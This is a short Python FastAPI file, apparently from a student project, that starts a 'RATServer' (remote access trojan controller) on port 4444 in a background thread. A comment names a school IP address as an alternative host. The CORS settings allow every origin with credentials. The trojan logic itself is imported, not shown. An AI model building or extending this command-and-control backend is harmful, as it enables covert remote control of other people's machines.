from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from routes import user, clients
from host.server import RATServer
import threading

app = FastAPI()

origins = ["*"]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"])


def start_rat_server():
    # For school: 158.149.96.13
    server = RATServer('localhost', 4444)

    try:
        main = threading.Thread(target=server.build_connection)
        main.start()
    except Exception as e:
        print(e)
        print("Error starting RAT server")


rat_server = threading.Thread(target=start_rat_server)
rat_server.start()

app.include_router(user.app, prefix="/api/v1")
app.include_router(clients.app, prefix="/api/v1")
